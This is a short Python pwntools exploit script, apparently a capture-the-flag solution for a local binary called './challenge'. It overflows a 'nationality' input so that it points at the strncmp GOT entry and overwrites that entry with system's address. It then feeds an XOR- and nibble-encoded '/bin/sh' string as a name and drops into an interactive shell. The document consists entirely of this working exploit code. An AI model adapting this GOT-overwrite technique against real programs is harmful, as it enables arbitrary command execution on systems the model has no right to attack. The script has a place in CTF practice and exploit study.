#!/usr/bin/python 
from pwn import *

binsh = "2F 62 69 6E 2F 73 68 00 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF".split(" ")
main = "55 48 89 E5 48 83 EC 50 64 48 8B 04 25 28 00 00 00 48 89 45 F8 31 C0 E8 24 FE FF FF 48 8D 45 C0".split(" ")

context.log_level = 'debug'
p = process("./challenge")
gdb.attach(p)
elf = ELF("./challenge")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
strncmp_got = elf.got['strncmp']
strncmp_plt = elf.plt['strncmp']
system = elf.plt['system']

p.sendafter("> ", '2')

p.sendafter("nationality: ", 'A'*0x10+p64(strncmp_got))

p.sendafter("> ", '3')
p.sendlineafter("age: ", str(system))

re = ""
for i in range(len(binsh)):
    a = ord(chr(int(main[i], 16) ^ int(binsh[i], 16)))
    re += chr((a >> 4) + ((a & 0xf) << 4))

p.sendafter("> ", '1')
p.sendafter("name: ", re)
p.sendafter("> ", '4')

p.interactive()
